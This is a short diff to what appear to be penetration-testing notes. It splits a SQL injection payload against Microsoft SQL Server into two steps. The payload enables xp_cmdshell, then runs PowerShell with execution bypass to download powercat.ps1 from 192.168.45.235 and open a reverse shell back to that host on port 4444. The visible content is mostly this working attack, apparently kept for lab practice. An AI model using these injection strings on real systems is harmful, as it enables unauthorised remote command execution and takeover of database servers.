@@ -725,7 +725,8 @@ For windows IIS servers, we need to use gobuster with aspx extension and word li
 
 need to enable cmd_shell
 ```
-';EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE; EXEC master.dbo.xp_cmdshell 'powershell.exe -exec bypass -Command "IEX (New-Object Net.WebClient).DownloadString(\"http://192.168.45.235/powercat.ps1\");powercat -c 192.168.45.235 -p 4444 -e powershell"';--+//
+';EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;--+//
+';EXEC master.dbo.xp_cmdshell 'powershell.exe -exec bypass -Command "IEX (New-Object Net.WebClient).DownloadString(\"http://192.168.45.235/powercat.ps1\");powercat -c 192.168.45.235 -p 4444 -e powershell"';--+//
 ```
 
 ** Make sure to go back to root directory before running
